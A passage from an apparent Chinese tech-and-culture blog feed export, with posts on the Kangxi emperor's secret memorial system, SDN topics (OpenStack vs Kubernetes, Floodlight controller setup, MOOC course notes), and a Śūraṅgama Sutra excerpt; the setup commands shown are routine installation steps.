<p>清随明制，基本上继承了题本和奏本为基础的本章制度，但是该制度存在几项弊端：<br>第一，保密性差。官员本章首先送到通政司，由该衙门官员负责誊写摘录后报送内阁，内阁大臣票拟贴黄（初步建议）呈皇帝裁定，最后内阁按照皇帝的决定下达命令给六科、部院和地方官员。当然，经通政司转呈的奏本，上奏官员亦可以写上“密奏”两个字，理论上会有较为保密的处理方式。<br>第二，处理效率问题。很难明确区分紧急事务和日常事务。不利于将各种问题在适当的层次上、根据合理的次序解决。<br>第三，报告官员有限。题本只限于高级文武官员使用，如总督、巡抚、八旗驻防将军、及各部院尚书、侍郎。例如江宁织造的正式职衔只是内务府五品郎中。</p>
<p>有鉴于此，康熙在常规渠道之外建立了一套秘密的、非正式制度，用来接收官员奏报并下达指示，即密折制度。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Red-2018-2.png" alt="密折制度"></p>
<p>密折制度很可能起源于“请安折”。请安折一般就只有一两行，表示叩谢皇恩，恭祝皇上龙体康泰。但是，皇帝有意识地引导臣下丰富折子的内容，康熙不仅针对密折内容给出具体意见，还反复强调保密性。</p>
<blockquote>
<p>王鸿绪密折(朱批)：京中如有可闻之事，卿可密书奏折，与请安封内奏闻，不可令人知道。倘泄漏甚有关系，小心！小心！</p>
<p>曹寅密折(朱批)：朕无可以托人打听，尔等受恩深重，但有所闻，可以亲手书折奏闻才好。此话断不可以叫人知道，若有人知，尔即招祸矣！</p>
</blockquote>
<h4 id="密折案例"><a href="#密折案例" class="headerlink" title="密折案例"></a>密折案例</h4><p>从现存资料来看，内务府江宁织造、苏州织造的密奏内容集中在四个方面：农业、高级官员、匪盗和社会舆论情况。</p>
<p>例如,1693 年李煦在请安折上汇报了江南地区的米市行情: 干旱缓解，米价平稳，粗米七钱，细白好米一两。</p>
<blockquote>
<p>朱批：但有南来者，必问详情，闻尔所奏，少解宵旰之劳。秋收之后，还写奏帖奏来。凡有奏帖，万不可与人知道。</p>
</blockquote>
<p>康熙四十八年朱批：<strong>熊赐履近况如何？</strong>  （熊赐履，1635年－1709年，顺治十五年进士，康熙朝历任翰林学士、武英殿大学士、礼部尚书、吏部尚书，康熙四十二年致仕）。</p>
<blockquote>
<p>曹寅：打听得熊赐履在家，不曾远出。其同城各官有司往拜者，并不接见。近日与江宁一二秀才陈武循、张纯及鸡鸣寺僧，看花作诗，有小桃园杂咏二十四首，此其刊刻流布在外者，谨呈御览。因其不与交游，不能知其底蕴。谨据所得实奏。</p>
<p>曹寅：臣细探得熊赐履湖广原籍有祖遗住房一所，田不足百亩，江宁现有大住房一所，田一百余亩，江楚两地房田价值约可七八千两。…… 熊赐履在日未闻共向人借贷之事。其间或有门生故吏周济，或地方来往官员赠贻，故过日充裕，较之汉官大臣内，亦属中等过活，未见甚贫。</p>
</blockquote>
<p>短短几句就包含了一位退休高官的日常活动、社会往来的大量细节，可以算是一份古代版的信用报告了（“看花”一词可能是寻花问柳的一种委婉说法）。要知道，熊赐履可是康熙实际上的老师，此时已是将死之人，窥探如此，何况他人乎。</p>
<p>康熙尤其关注江南的 <strong>市井流言、社会舆情</strong>。</p>
<blockquote>
<p>朱批：近日闻得南方有许多闲言，无中生有，议论大小事。</p>
<p>曹寅密奏：江宁洪武陵冢上西北角梧桐树下陷蹋一窟，口面有五尺余寸，深约二丈余，下视如井…… 民间讹言冢已塌下，臣随往勘验，离地宫尚远十五丈余，毫不相关，原系当先培填之土不坚，日久值雨冲蹋，水流宝城之外。当有地方该管官员，即命陵户挑土填平。恐谣言流播，讹传失实，合先奏闻。</p>
<p>朱批：知道了。此事奏闻的是，尔再打听，还有甚么闲话，写折来奏。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Red-2018-1.png" alt></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>康熙为了查核常规的官僚体系，需要纯属私人的消息来源。织造官员由于其内务府包衣的特殊出身（皇家专属奴仆）、与皇帝亲密的个人关系、与地方官员和商人的广泛联系，有助于提供广泛的准确情报，为诸多决策提供依据，可以说是康熙皇帝治理体系的重要组成部分。诚如他自己所言：</p>
<blockquote>
<p>朕临莅天下五十余年，遍谙诸事，于满洲、蒙古、汉军、汉人，毫无异视 …… 阅朕此旨，是则是，非则非。</p>
</blockquote>
<p>帝国庞大的秘密情报系统中，包括曹寅等人在内，似乎很乐意从事这一工作，他们感觉到自己与天子的接触直接且非常私人，他们将用更诚挚、更真心的效忠回报皇帝的知遇和信任。但是这种高度私人化关系，在改朝换代之后就显得不那么美妙了。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/04/Redology-DunMing/" target="_blank" rel="noopener">红楼故事：佩刀沽酒作长歌</a></li>
<li><a href="https://riboseyim.github.io/2018/02/04/Redology-Intelligence/" target="_blank" rel="noopener">红楼故事：康熙的秘密情报系统</a></li>
</ul>
<h2 id="参考书"><a href="#参考书" class="headerlink" title="参考书"></a>参考书</h2><ul>
<li>雍正《大义觉迷录》</li>
<li>史景迁|《康熙与曹寅》</li>
<li>孔飞力|《叫魂》</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>生活艺术</category>
      </categories>
      <tags>
        <tag>History</tag>
        <tag>Artistic</tag>
        <tag>Intelligence</tag>
        <tag>Redology</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN 技术指南（六）：OpenStack or Kubernetes ?</title>
    <url>/2017/10/16/SDN-Cloud/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>待编辑</strong></p>
<span id="more"></span>
<h2 id="SDN-与-OpenStack"><a href="#SDN-与-OpenStack" class="headerlink" title="SDN 与 OpenStack"></a>SDN 与 OpenStack</h2><h4 id="OpenStack-核心组件"><a href="#OpenStack-核心组件" class="headerlink" title="OpenStack 核心组件"></a>OpenStack 核心组件</h4><div class="table-container">
<table>
<thead>
<tr>
<th>组件</th>
<th>OpenStack实现</th>
<th>AWS实现</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>计算组件（Compute）</td>
<td>Nova</td>
<td>EC2</td>
<td>提供按需交付的虚拟机资源</td>
</tr>
<tr>
<td>镜像组件（Image）</td>
<td>Glance</td>
<td></td>
<td></td>
</tr>
<tr>
<td>对象存储组件（Object Storage）</td>
<td>Swift</td>
<td>S3</td>
<td>无需额外进行文件路径的挂载操作</td>
</tr>
<tr>
<td>块存储组件（Block Storage）</td>
<td>Cinder</td>
<td>EBS</td>
<td>曾用名 Nova-volumem</td>
</tr>
<tr>
<td>网络服务组件（Network）</td>
<td>Quantum</td>
<td>VPC</td>
<td>满足其它组件所需的网络链接要求</td>
</tr>
<tr>
<td>仪表盘组件（Dashboard）</td>
<td>Horizon</td>
<td>Console</td>
<td>管理操作界面</td>
</tr>
<tr>
<td>身份识别组件（Identity）</td>
<td>Keystone</td>
<td>IAM</td>
<td>指定服务目录</td>
</tr>
</tbody>
</table>
</div>
<h2 id="SDN-与-Kubernetes"><a href="#SDN-与-Kubernetes" class="headerlink" title="SDN 与 Kubernetes"></a>SDN 与 Kubernetes</h2><h4 id="Discuss"><a href="#Discuss" class="headerlink" title="Discuss"></a>Discuss</h4><ul>
<li><p><a href="https://www.mirantis.com/blog/is-kubernetes-repeating-openstacks-mistakes/">Is Kubernetes Repeating OpenStack’s Mistakes? | Boris Renski    on September 7, 2017</a></p>
</li>
<li><p><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></p>
</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=2653547612&amp;idx=1&amp;sn=849342b58c0c375992b44644e54e2599&amp;mpshare=1&amp;scene=1&amp;srcid=0802Adt4W0K3y7LoOD9b3bvB#rd">容器化OpenStack对未来架构的影响 | 陈沙克</a></li>
<li><a href="http://www.chenshake.com/2016-openstack-summary/">2016年 OpenStack 总结 | 陈沙克</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTAzMDEwMA==&amp;mid=2652501209&amp;idx=1&amp;sn=9a22bb031b96b151af23df73f2e50452&amp;chksm=80201de2b75794f4f67e290c0f813ce17ac4499e5f6f2f2e6fb65fa427285eb4c48296d91765&amp;mpshare=1&amp;scene=1&amp;srcid=1127kiS81z5QcJhXFxtg70af#rd">OpenStack落地的五大难点 | 肖力@云技术实践</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN-CASE</title>
    <url>/2019/06/07/SDN-CASE/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/" target="_blank" rel="noopener">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/" target="_blank" rel="noopener">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/" target="_blank" rel="noopener">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/" target="_blank" rel="noopener">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>Religion-Buddha</title>
    <url>/2017/10/23/Religion-Buddha/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="楞严经"><a href="#楞严经" class="headerlink" title="楞严经"></a>楞严经</h2><p>淫逸其心。破佛律仪。潜行贪欲。口中好言诸佛应世。某处某人。当是某佛化身来此。某人即是某菩萨等。来化人间。其人见故。心生倾渴。邪见密兴。种智销灭。此名魅鬼年老成魔。恼乱是人。厌足心生。去彼人体。弟子与师。俱陷王难。汝当先觉。不入轮回。迷惑不知。堕无间狱。</p>
<p>尔时天魔口说经法。其人实不觉知魔著。亦言自得无上涅槃。来彼求合善男子处。敷座说法。其形及彼听法之人。外无迁变。令其听者。未闻法前。心自开悟。念念移易。或得宿命。或有他心。或见地狱。或知人间好恶诸事。或口说偈。或自诵经。各各欢娱。得未曾有。是人愚迷。惑为菩萨。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.psychologytoday.com/blog/think-act-be/201710/how-helping-others-can-relieve-anxiety-and-depression" target="_blank" rel="noopener">How Helping Others Can Relieve Anxiety and Depression |New research shows one more way that compassion is beneficial.|Posted Oct 10, 2017</a><br>compassionate goals were associated with lower levels of symptoms and less relationship conflict.</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>SDN 技术指南（三）：OpenDaylight or Floodlight</title>
    <url>/2017/10/16/SDN-Controller/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>OpenDaylight or Floodlight</li>
</ul>
<span id="more"></span>
<h2 id="Floodlight"><a href="#Floodlight" class="headerlink" title="Floodlight"></a>Floodlight</h2><h4 id="Install-amp-Run"><a href="#Install-amp-Run" class="headerlink" title="Install &amp; Run"></a>Install &amp; Run</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ git clone git:<span class="comment">//github.com/floodlight/floodlight.git</span></span><br><span class="line">$ cd floodlight/</span><br><span class="line">$ ant</span><br><span class="line">$ java -jar target/floodlight.jar</span><br><span class="line"><span class="comment">// 默认监听端口 6633</span></span><br></pre></td></tr></table></figure>
<ul>
<li>配置 Open vSwitch 连接Floodlight</li>
</ul>
<p>一个 OVS 可以同时配置一个或者多个控制器</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ ovs-vsctl set-controller ovs-<span class="keyword">switch</span> tcp:<span class="number">9.181</span><span class="number">.137</span><span class="number">.182</span>:<span class="number">6633</span></span><br></pre></td></tr></table></figure>
<h2 id="OPNFV"><a href="#OPNFV" class="headerlink" title="OPNFV"></a>OPNFV</h2><h4 id="ebook-Understanding-OPNFV"><a href="#ebook-Understanding-OPNFV" class="headerlink" title="ebook | Understanding OPNFV "></a><a href="https://www.opnfv.org/resources/download-understanding-opnfv-ebook">ebook | Understanding OPNFV </a></h4><ul>
<li><a href="https://www.linux.com/blog/opnfv/2017/9/network-functions-virtualization-all-roads-lead-opnfv">Network Functions Virtualization: All Roads Lead to OPNFV</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN技术指南：推荐课程</title>
    <url>/2019/06/07/SDN-MOOC/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>《软件定义网络技术 Software Defined Networking,SDN》</li>
<li>主讲人：温州大学 | 施晓秋</li>
<li><a href="http://www.icourse163.org/learn/WZU-1205809832?tid=1206444220#/learn/content?type=detail&amp;id=1211155089" target="_blank" rel="noopener">中国大学MOOC链接</a><a id="more"></a>
</li>
</ul>
<h2 id="第一讲-概述"><a href="#第一讲-概述" class="headerlink" title="第一讲 概述"></a>第一讲 概述</h2><ul>
<li>主讲人：施晓秋</li>
</ul>
<h3 id="网络系统的生命周期"><a href="#网络系统的生命周期" class="headerlink" title="网络系统的生命周期"></a>网络系统的生命周期</h3><ul>
<li>需求调研</li>
<li>规划设计</li>
<li>部署实施</li>
<li>运行维护</li>
</ul>
<h4 id="需求调研"><a href="#需求调研" class="headerlink" title="需求调研"></a>需求调研</h4><ul>
<li>互连范围</li>
<li>互连规模</li>
<li>拟承载的应用：对象、类型、用户规模、服务质量</li>
</ul>
<h4 id="规划设计"><a href="#规划设计" class="headerlink" title="规划设计"></a>规划设计</h4><ul>
<li>网络架构与拓扑</li>
<li>IP 和 路由</li>
<li>安全和QoS策略</li>
</ul>
<p><strong>体现一定的冗余</strong></p>
<h4 id="部署实施"><a href="#部署实施" class="headerlink" title="部署实施"></a>部署实施</h4><h4 id="设备部署实施"><a href="#设备部署实施" class="headerlink" title="设备部署实施"></a>设备部署实施</h4><ul>
<li>上架</li>
<li>配置</li>
<li>连通</li>
</ul>
<h4 id="系统部署实施"><a href="#系统部署实施" class="headerlink" title="系统部署实施"></a>系统部署实施</h4><ul>
<li>集成</li>
<li>上线</li>
<li>测试</li>
</ul>
<h4 id="运行维护"><a href="#运行维护" class="headerlink" title="运行维护"></a>运行维护</h4><ul>
<li>网络状态的监控与管理：设备、用户、流量、应用；发现并排除网络故障与隐患</li>
</ul>
<h3 id="新一代网络架构"><a href="#新一代网络架构" class="headerlink" title="新一代网络架构"></a>新一代网络架构</h3><h4 id="传统网络主要问题"><a href="#传统网络主要问题" class="headerlink" title="传统网络主要问题"></a>传统网络主要问题</h4><ul>
<li><p>多元、多变的网络上层应用与业务</p>
</li>
<li><p>相对稳定的网络架构设计及系统运维</p>
</li>
</ul>
<h3 id="SDN-vs-计算机"><a href="#SDN-vs-计算机" class="headerlink" title="SDN vs 计算机"></a>SDN vs 计算机</h3><div class="table-container">
<table>
<thead>
<tr>
<th>计算机</th>
<th>SDN</th>
</tr>
</thead>
<tbody>
<tr>
<td>裸机</td>
<td>基础设施层</td>
</tr>
<tr>
<td>操作系统</td>
<td>控制层</td>
</tr>
<tr>
<td>用户与应用程序接口</td>
<td>API</td>
</tr>
<tr>
<td></td>
</tr>
</tbody>
</table>
</div>
<h4 id="架构变化"><a href="#架构变化" class="headerlink" title="架构变化"></a>架构变化</h4><ul>
<li>网络设备：解耦，简单化</li>
<li>网络管理：集中控制器，全局化</li>
<li>网络运维：SDN南向接口，自动化</li>
<li>网络应用：SDN北向接口，人性化</li>
</ul>
<h3 id="Hisotry-of-SDN"><a href="#Hisotry-of-SDN" class="headerlink" title="Hisotry of SDN"></a>Hisotry of SDN</h3><h4 id="开创性人物"><a href="#开创性人物" class="headerlink" title="开创性人物"></a>开创性人物</h4><ul>
<li>Nick</li>
<li>Martin</li>
<li>Scott</li>
</ul>
<h4 id="开创性论文"><a href="#开创性论文" class="headerlink" title="开创性论文"></a>开创性论文</h4><ul>
<li><a href="#">《Ethance:Taking Control of the Enterprise》</a></li>
<li><a href="#">《OpenFlow:Enablling Innovation in Campus Networks》</a></li>
</ul>
<h4 id="开创性项目"><a href="#开创性项目" class="headerlink" title="开创性项目"></a>开创性项目</h4><h4 id="起源：2005年"><a href="#起源：2005年" class="headerlink" title="起源：2005年"></a>起源：2005年</h4><ul>
<li>2005年，美国国家自然科学基金会：网络创新实验环境（Global Environment Networking Innovations,GENI），斯坦福大学 Clean-Slate项目：McKeown Group团队。</li>
</ul>
<h4 id="初创期：2006-2011年-学术界"><a href="#初创期：2006-2011年-学术界" class="headerlink" title="初创期：2006-2011年 [学术界]"></a>初创期：2006-2011年 [学术界]</h4><ul>
<li>Martin 领导 Ethane 项目</li>
<li>Martin 联合 Nick教授、Scott教授创建 <a href="#">Nicira</a>公司,在 SIGCOMM 会议发表论文 <a href="#">《Ethance:Taking Control of the Enterprise》</a></li>
<li>The McKeown Group 发布第一个开源SDN控制器 NOX-Classic,在 SIGCOMM 会议发表论文<a href="#">《OpenFlow:Enablling Innovation in Campus Networks》</a></li>
<li>2009年，The McKeown Group 发布第一个基于Python语言的SDN控制器 POX，同时发布了 OpenFlow v1.0</li>
<li>2010年，The McKeown Group 发布开源SDN网络模拟器Mininet</li>
<li>2011年，开放网络基金会(Open Networking Foundation,ONF)成立</li>
<li>2012年，Google 发布应用SDN技术解决数据中心之间流量问题的方案</li>
<li>2012年，BigSwitch发布开源控制器 Floodlight</li>
<li>2012年，日本NTT公司发布开源控制器 Ryu</li>
</ul>
<h4 id="成熟期：2012至今（学术界-产业界）"><a href="#成熟期：2012至今（学术界-产业界）" class="headerlink" title="成熟期：2012至今（学术界+产业界）"></a>成熟期：2012至今（学术界+产业界）</h4><ul>
<li>2013年，美国AT&amp;T、英国电信、德国电信等提出了 <strong>网络功能虚拟化（NFV）</strong> 的概念</li>
<li>2014年，斯坦福大学、加州伯克利分校共同成立开放网络实验室（ONLab），发布开放网络操作系统（ONOS）</li>
<li>2015年</li>
<li>2016年，开放网络基金会（ONF）与开放网络实验室（ONLab）合并，主推 CORD 和 ONOS</li>
<li>2016年，思科发布全数字化网络架构-DNA</li>
<li>2017年，VMware 宣布 NSX 带来 10 亿美元销售额</li>
<li>2018年，Cisco、Apstra 等推出基于意图的网络（Intent-based Network ）</li>
</ul>
<h3 id="发展趋势"><a href="#发展趋势" class="headerlink" title="发展趋势"></a>发展趋势</h3><h4 id="SD-WAN-广域网"><a href="#SD-WAN-广域网" class="headerlink" title="SD-WAN 广域网"></a>SD-WAN 广域网</h4><h5 id="中国移动（S-Controller）"><a href="#中国移动（S-Controller）" class="headerlink" title="中国移动（S-Controller）"></a>中国移动（S-Controller）</h5><ul>
<li>主控制器：中国移动（S-Controller）</li>
<li>厂商控制器：华为(D-Controller)、中兴(D-Controller)</li>
</ul>
<h4 id="SD-Security-安全"><a href="#SD-Security-安全" class="headerlink" title="SD-Security 安全"></a>SD-Security 安全</h4><h4 id="SD-Access-接入"><a href="#SD-Access-接入" class="headerlink" title="SD-Access 接入"></a>SD-Access 接入</h4><h4 id="技术融合"><a href="#技术融合" class="headerlink" title="技术融合"></a>技术融合</h4><p>基于意图的网络：机器学习+SDN控制器</p>
<h3 id="SDN-Standards"><a href="#SDN-Standards" class="headerlink" title="SDN Standards"></a>SDN Standards</h3><p>系统兼容性</p>
<h4 id="标准化组织-ONF"><a href="#标准化组织-ONF" class="headerlink" title="标准化组织 ONF"></a>标准化组织 ONF</h4><p>开放网络基金会(Open Networking Foundation,ONF)是软件定义网络技术标准化和产业化的主要力量。</p>
<p>ONF 组织架构：</p>
<ul>
<li>拓展组</li>
<li>配置管理组</li>
<li>测试和互操作组</li>
<li>北向接口组</li>
<li>架构组</li>
<li>混合组</li>
<li>市场组</li>
</ul>
<p>ONF 主要工作：</p>
<ul>
<li>SDN 白皮书</li>
<li>OpenFlow 协议</li>
<li>OF-Config 协议</li>
</ul>
<h4 id="标准化组织-IETF"><a href="#标准化组织-IETF" class="headerlink" title="标准化组织 IETF"></a>标准化组织 IETF</h4><p>因特网工程任务组（IETF）：全球互联网最具权威的技术标准化组织。SDN 技术标准主要由网络设备厂商主导。</p>
<p>IETF 相关研究工作组：</p>
<ul>
<li>转发与控制分离组：主要关注需求、架构、协议、转发单元模型和MIB</li>
<li>应用层流量优化工作组：主要关注为应用层提供更多的网络信息，完成应用层的流量优化</li>
<li>路由领域公开的研究组：针对 I2RS 的问题描述、需求和应用场景</li>
</ul>
<h4 id="标准化组织-ITU-T"><a href="#标准化组织-ITU-T" class="headerlink" title="标准化组织 ITU-T"></a>标准化组织 ITU-T</h4><p>背景：国际电信联盟<br>主要关注：运营商网络的场景对象和相关架构</p>
<p>ITU-T 关于SDN的标志性项目：</p>
<ul>
<li>Y.FNsdn-fmV</li>
<li>Y.FNsdn</li>
</ul>
<h4 id="标准化组织-ETSI"><a href="#标准化组织-ETSI" class="headerlink" title="标准化组织 ETSI"></a>标准化组织 ETSI</h4><p>欧洲电信标准化协会（ETSI）</p>
<p>运营商发起成立网络功能虚拟化标准工作组（NFV ISG）,关注 SDN+NFV。</p>
<h2 id="第二讲-技术架构"><a href="#第二讲-技术架构" class="headerlink" title="第二讲 技术架构"></a>第二讲 技术架构</h2><h3 id="SDN主流技术架构"><a href="#SDN主流技术架构" class="headerlink" title="SDN主流技术架构"></a>SDN主流技术架构</h3><h4 id="基于-OpenFlow-的三层技术架构"><a href="#基于-OpenFlow-的三层技术架构" class="headerlink" title="基于 OpenFlow 的三层技术架构"></a>基于 OpenFlow 的三层技术架构</h4><p>推动：ONF<br>优势：流量调度、开放生态链</p>
<h3 id><a href="#" class="headerlink" title="#"></a>#</h3><p>推动：IETF<br>优势：开放现有网络设备的能力、标准开放的API</p>
<h2 id="资料卡"><a href="#资料卡" class="headerlink" title="资料卡"></a>资料卡</h2><h4 id="施晓秋（温州大学）"><a href="#施晓秋（温州大学）" class="headerlink" title="施晓秋（温州大学）"></a>施晓秋（温州大学）</h4><ul>
<li>1985年，浙江大学物理系，理学学士</li>
<li>1985至1997年，温州大学物理教研室教师</li>
<li>1998年，浙江大学计算机系，工学硕士</li>
<li>2000年至2004年，在温州大学信息科学与工程学院，院长助理、副院长</li>
<li>2005年后，温州大学城市学院，温州大学思科网络技术学院。</li>
